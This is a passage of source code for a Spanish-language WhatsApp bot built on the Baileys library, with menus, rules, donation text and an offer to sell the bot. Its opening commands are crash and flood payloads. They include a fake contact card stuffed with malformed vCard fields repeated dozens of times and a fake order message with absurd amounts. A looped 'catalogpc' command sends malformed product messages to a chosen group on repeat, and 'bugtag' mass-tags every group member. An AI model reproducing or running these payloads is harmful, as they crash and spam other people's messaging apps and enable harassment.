 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© Simple•MD`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:AzzBot•MD\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
simple.sendContact(m.chat, global.owner, fkontaak)
}
break
case 'bug1': {
if (!isCreator) return
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
simple.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
case 'lokas': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/pdfimg.jpg') }, { upload: simple.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© simple${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": thumb,
}
}), { userJid: m.chat, quoted: doc })
simple.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
case 'location': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/pdfimg.jpg') }, { upload: simple.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© simple`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": thumb,
}
}), { userJid: m.chat, quoted: m })
simple.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
case 'troli': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/fake.jpeg') }, { upload: simple.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© ...`,
"jpegThumbnail":fs.readFileSync('./media/fake.jpeg'),
"orderTitle": `© 😋${ngazap(prefix)}`,
"sellerJid": "593991398786@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
simple.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'bugtag': {
if (!m.isGroup) throw mess.group
simple.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: doc })
}
break
case 'catalogpc': case 'cataloggc':  {
if (!isCreator) return
if (args.length < 1) return reply(`*error!*\n\nUsa : ${command} idGroup|cantidad spam|temporizador\nEjemplo : ${command} 59399@g.us|1|10s\n\n\ns = Segundo\n\nAsegúrate de que el bot haya entrado en el grupo.`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/azz.jpg') }, { upload: simple.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© SIMPLE•MD${ngazap(prefix)}`,
"description": `© SIMPLE•MD${ngazap(prefix)}`,
"currencyCode": "IDR",
"footerText": `© SIMPLE•MD`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© SIMPLE•MD WE ARE NOT MASTOD${ngazap(prefix)}`,
"url": "wa.me/593991398786"
},
"businessOwnerJid": "593991398786@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc})
simple.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
reply(`Éxito Enviar error a: ${num}\nCantidad de correo no deseado: ${jumlah}`)
}
break
//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Reportes ™ ❞|═══════════════════════════════════════════⬡|//	

                    case 'bug': case 'report': {
                    	
                    	if(!text) throw `Introduzca el ejemplo de error\n\n${command} : Menu Erroneo `
                    	simple.sendMessage(`593991398786@s.whatsapp.net`, {text: `*Informe de error de:* wa.me/${m.sender.split("@")[0]}
Mensaje de informe: ${text}` })
reply(`Reportado con éxito al propietario\n\nAsegúrese de que el error sea válido, si juega con esto, use esta función una y otra vez sin motivo, será bloqueado con seguridad !`)
                    }
                    break
                    case 'solicitar': case 'solicit': {
                    	
                    	if(!text) throw `Introduzca su solicitud\n\n${command} : deseó.... `
                    	simple.sendMessage(`593991398786@s.whatsapp.net`, {text: `*Solicitud de:* wa.me/${m.sender.split("@")[0]}
mensaje de Solicitud: ${text}` })
reply(`Enviado con éxito al propietario\n\nAsegúrese de que haya escrito bien su solicitud, si juega con esto, use esta función una y otra vez sin motivo, será bloqueado con seguridad !`)
                    }
                    break


//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Donación + compra ™ ❞|═══════════════════════════════════════════⬡|//	
	    case 'donar': {
                simple.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/149e775adfaa5e719d3a5.png' }, caption: `
                *❒ 「 Donaciones 」 ❒

→Hola Usuario de © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛 
Si deseas hacer una donación para invitarle una Taza de café a mi creador se agradecería mucho.

→Al momento de Donarme, se te otorgará unos beneficios a manera de agradecimiento, ya que tu ayuda es muy importante para mantener al bot actualizado y en mantenimiento.


•Se te Otorgará el Premium 💵
¿Para qué sirve?
→Este bot usa un sistema que limita a los usuarios gratuitos a un uso de 30 comandos cada 12 horas, (no en todos los comandos), El usuarios Premium no tendrá limite en ningun comando.


•El bot se unirá a tu grupo
¿Cómo Será?
→Se te otorgará la posibilidad de que puedas añadir el bot a un grupo tuyo, y podras disfrutar de el, Siempre que se mantenga activo!


Para saber sobre más beneficios por donar habla con el Owner: wa.me/593991398786


De antemano se agradece tú apoyo a este proyecto, ya que me ayudas a que siga vivo y se mantenga con el pasar del tiempo.!


El uso de © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛 es 100% gratuito, tú donación solo ayudará a mejorarlo a cambio de beneficios.

¡Muchos gracias! Para ustedes, amigos usuarios y algunas personas que también ayudaron en el proyecto. Att © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛.*` 
}, { quoted: m })
            }
            break
	    case 'rcompra': {
                simple.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/149e775adfaa5e719d3a5.png' }, caption: `
*❒ 「 Terminos de Compra 」 ❒

→Al momento de Efectuar la compra de © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛 se tomarán en cuenta los siguientes aspectos

→Al momento de Donarme, se te otorgará unos beneficios a manera de agradecimiento, ya que tu ayuda es muy importante para mantener al bot actualizado y en mantenimiento.


1•_ Se verificará que el pago sea legítimo, con comprobante. todo al creador del bot.

2•_ Solo se dará la versión por la que hayas pagado.

3•_.El bot será completamente tuyo, y podrás disfrutar de los beneficios.

4•_No se aceptad devoluciones.

5•_ Comprueba los precios en ${prefix}comprarbot.

Al comprar este bot me estás apoyando a crecer y mantener este bot, Gracias de antemano.. Att © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛.*` 
}, { quoted: m })
            }
            break
            case 'comprarbot': {
                let anu = `
┌────────┈❖
│「 Hola, ${pushname}👋 」
│「 ${timebro} 」
└┬─────────────┈❖
┌┤「 COMPRAR BOT 」
│└─────────────┈❖
│⭔ Bot 100% Completo 10$ usd
│⭔ Bot +50Cmd Sin mis Apis 3$ usd
│⭔ Bot +100Cmd Y Template Buttons 5$ usd
│⭔ Bot +200Cmd y Template + apis 7$ usd
└┬─────────────┈❖
┌┤「 PAGO 」
│└─────────────┈❖
│⭔ PayPal : ${global.paypal}
└┬─────────────┈❖
┌┤「 VENTAJAS 」
│└─────────────┈❖
│⭔Bot 100% Editable 
│⭔ Host Vps/Heroku/Oktote/BoxMineHost
│⭔100% tuyo
│⭔ Comandos funcionales
│⭔ Antilink
│⭔ Welcome
│⭔ Despedida
└┬─────────────┈❖
┌┤「 SISTEMA 」
│└─────────────┈❖
│⭔ Enviar prueba de pago » y el » Bot es tuyo
└──────────────┈❖
`
                let btn = [{
                                urlButton: {
                                    displayText: 'PayPal',
                                    url: 'https://www.paypal.me/CarlosTwT'
                                }
                            }, {
                                callButton: {
                                    displayText: 'número Owner',
                                    phoneNumber: '+593 99 139 8786'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Reglas de Compra',
                                    id: `${prefix}rcompra`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Donar',
                                    id: `${prefix}donar`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Vcard Owner',
                                    id: `${prefix}owner`
                                }
                            }]
                         let setbot = db.data.settings[botNumber]
                        if (setbot.templateImage) {
                        simple.send5ButImg(m.chat, anu, simple.user.name, global.thumb, btn, global.thumb)
                        } else if (setbot.templateGif) {
                        simple.send5ButGif(m.chat, anu, simple.user.name, global.pp_video, btn, global.thumb)
                        } else if (setbot.templateVid) {
                        simple.send5ButVid(m.chat, anu, simple.user.name, global.pp_video, btn, global.thumb)
                        } else if (setbot.templateMsg) {
                        simple.send5ButMsg(m.chat, anu, simple.user.name, btn)
                        } else if (setbot.templateLocation) {
                        simple.send5ButLoc(m.chat, anu, simple.user.name, global.thumb, btn)
                        }
                     }
            break
            case 'sc': {
                let anu = `
❒ 「 Base 」 ❒


SimpleBot: https://github.com/CarlosTwT 
`
                let btn = [{
                                urlButton: {
                                    displayText: 'Instagran',
                                    url: 'https://github.com/c4rl0s_9e'
                                }
                            }, {
                                callButton: {
                                    displayText: 'número Owner',
                                    phoneNumber: '+593 99 139 8786'
                                }
                            }]
                         let setbot = db.data.settings[botNumber]
                        if (setbot.templateImage) {
                        simple.send5ButImg(m.chat, anu, simple.user.name, global.thumb, btn, global.thumb)
                        } else if (setbot.templateGif) {
                        simple.send5ButGif(m.chat, anu, simple.user.name, global.pp_video, btn, global.thumb)
                        } else if (setbot.templateVid) {
                        simple.send5ButVid(m.chat, anu, simple.user.name, global.pp_video, btn, global.thumb)
                        } else if (setbot.templateMsg) {
                        simple.send5ButMsg(m.chat, anu, simple.user.name, btn)
                        } else if (setbot.templateLocation) {
                        simple.send5ButLoc(m.chat, anu, simple.user.name, global.thumb, btn)
                        }
                     }
            break

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 Reglas™ ❞|═══════════════════════════════════════════⬡|//	

                        case 'rules': {
                let anu = `
❒ 「 Reglas y preguntas 」 ❒

1. No enviar spam. 🙅
Sanciones: *❎ ALERTA/BLOQUEO*

2. No me llames. ☎️
Sanciones: *❎ BLOQUEO + REPORTE*

3. No explotación laboral.😖
Sanciones: *BLOQUEO PERMANENTE*

🗯️ Bot no responde o lento para responder ?
➡️ Puede verse afectado por la red, la señal, prohibido por Whatsapp y alguna razón. Sigue obedeciendo las reglas‼️

🗯️ ¿Dónde puedo obtener el Script de este bot? ?
➡️ Este script aún es privado y nunca se ha comercializado, tenga cuidado al conocer a los estafadores..

🗯️ puedo agregar al grupo?
➡️ Por el momento, el bot está privado para agregar a grupos.

🗯️ ¿Cuál es el prefijo??
➡️ Este bot usa múltiples prefijos. Significa que puedes usar el prefijo #, . , Y otro prefijo razonable.

🗯️ Man, ¿cómo es que el propietario del bot no responde??
➡️ El propietario solo responde a familiares, amigos, reportes sobre el bot y problemas de error, no para personas rogando por scripts..


Si entiende las reglas, por favor escriba *menu* para comenzar!

⚠️ Todas las políticas y condiciones de © ঔৣ͜͡Ⓒ_乂 Simple WhatsApp - Bot_ 愛 están en manos del propietario y todos los cambios de política, en cualquier momento, el propietario tiene derecho a revocar, bloquear usuarios(*﹏*) 

¡Muchos gracias! Para ustedes, amigos usuarios y algunas personas que también ayudaron en el proyecto. Att Carlos.
 😖🙏

`
                let btn = [{
                                urlButton: {
                                    displayText: 'Instagram',
                                    url: 'https://instagram.com/c4rl0s_9e'
                                }
                            }, {
                                callButton: {
                                    displayText: 'número Owner',
                                    phoneNumber: '+593 99 139 8786'
                                }
                            }]
                         let setbot = db.data.settings[botNumber]
                        if (setbot.templateImage) {
                        simple.send5ButImg(m.chat, anu, simple.user.name, global.thumb, btn, global.thumb)
                        } else if (setbot.templateGif) {
                        simple.send5ButGif(m.chat, anu, simple.user.name, global.pp_video, btn, global.thumb)
                        } else if (setbot.templateVid) {
                        simple.send5ButVid(m.chat, anu, simple.user.name, global.pp_video, btn, global.thumb)
                        } else if (setbot.templateMsg) {
                        simple.send5ButMsg(m.chat, anu, simple.user.name, btn)
                        } else if (setbot.templateLocation) {
                        simple.send5ButLoc(m.chat, anu, simple.user.name, global.thumb, btn)
                        }
                     }
            break

//|⬡════════════════════════════════════════════|❝ Ⓒ_乂 APARTADO MENÚ ™ ❞|═══════════════════════════════════════════⬡|//	

            case 'setmenu': {
            if (!isCreator) throw mess.owner
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateLocation'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                setbot.templateLocation = true
                m.reply(mess.success)
                } else {
                let sections = [
                {
                title: "CAMBIAR MENU BOT",
                rows: [
                {title: "Imagen de plantilla", rowId: `setmenu templateImage`, description: `Cambiar el bot de menú a Imagen de plantilla`},
                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Cambiar el bot de menú a Vídeo de plantilla`},
                {title: "Plantilla Gif", rowId: `setmenu templateGif`, description: `Cambiar el bot de menú a Gif de plantilla`},
                {title: "Plantilla Mensaje", rowId: `setmenu templateMessage`, description: `Cambiar el bot de menú a Mensaje de plantilla`},
                {title: "Plantilla Localización", rowId: `setmenu templateLocation`, description: `Cambiar el bot de menú a Ubicación de plantilla`}
                ]
                },
                ]
                simple.sendListMsg(m.chat, `Please select the menu you want to change!`, simple.user.name, `Hello Owner !`, `Click Here`, sections, m)
                }
            }
            break
            case 'menu': {
                let sections = [
                {
                title: "TIPO DE MENÚ >_<",
                rows: [
                {title: "⌲ 「 Catálogo 」", rowId: `${prefix}catalogom`, description: `menú catálogo`}
                ]
                },
                {
                title: "MENÚ FAKE PDF >_<",
                rows: [
                {title: "⌲ 「 PDF MENU 」", rowId: `${prefix}fakemenu`, description: `menú fake con pdf`}
                ]
                },
                {
                title: "MENÚ LOCALIZACIÓN >_<",
                rows: [
                {title: "⌲ 「 LOC MENU 」", rowId: `${prefix}locmenu`, description: `menú de localización en directo`}
                ]
                },
                {
                title: "MENÚ SIMPLE >_<",
                rows: [
                {title: "⌲ 「 MENÚ NORMAL 」", rowId: `${prefix}menunormal`, description: `este menú es simple`}
                ]
                },
                {
                title: "COMPRARME >_<",
                rows: [
                {title: "⌲ 「 BUY ME 」", rowId: `${prefix}comprarbot`, description: `mira mis planes de compra.`}
                ]
                },
                {
                title: "ACTIVIDAD DEL BOT >_<",
                rows: [
                {title: "⌲ 「 Runtime 」", rowId: `${prefix}runtime`, description: `click para mi tiempo activo`}
                ]
                },
                {
                title: "HABLAR CON EL OWNER? >_<",
                rows: [
                {title: "⌲ 「 Chat Owner 」", rowId: `${prefix}owner`, description: `Mostrar número de propietario de WhatsApp`}
                ]
                },
                {
                title: "REGLAS DEL BOT >_<",
                rows: [
                {title: "⌲ 「 Reglas 」", rowId: `${prefix}rules`, description: `mostrando los terminos de uso del bot !!`}
                ]
                }
                ]
                simple.sendListMsg(m.chat, `Por favor seleccione el tipo de menú u otro comando!`, simple.user.name, `Hola A Todos !`, `Click Aquí`, sections, m)
            }
            break
case 'fakemenu':
menufollow(from)
let timestamp = speed()
let latensi = speed() - timestamp
const botmd = "593991398786@s.whatsapp.net"
var mn = '```'
var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document','audio/mpeg','image/jpeg']
var bycrls = rndm[Math.floor(Math.random() * rndm.length)]
mbc = `${mn}      Ⓒ_乂 Simple WhatsApp - Bot_
       「  INFO BOT 」\n 𝘛𝘰𝘵𝘢𝘭 𝘏𝘪𝘵 𝘚𝘦𝘳𝘷𝘦𝘳 : ${conteocmd} \n 𝘛𝘰𝘵𝘢𝘭 𝘏𝘪𝘵 𝘛𝘰𝘥𝘢𝘺 : ${conteoscmds} \n Prefijo :  ${prefix} \n Nombre : ${botname}\n Owner : ${ownername}\n Runtime : ${runtime(process.uptime())}\n Librería : Baileys-Md\n\n   「 GRUPO 」

» ${prefix}react

» ${prefix}join [Gp link]

» ${prefix}add 593xxx

» ${prefix}kick @tag

» ${prefix}promote @tag

» ${prefix}demote @tag

» ${prefix}setname 

» ${prefix}setdesc

» ${prefix}setppgroup

» ${prefix}hidetag

» ${prefix}tagall

» ${prefix}totag

» ${prefix}encuesta

» ${prefix}checkvoto

» ${prefix}group open/close

» ${prefix}editinfo open/close

» ${prefix}antilink

» ${prefix}mute

» ${prefix}linkgroup

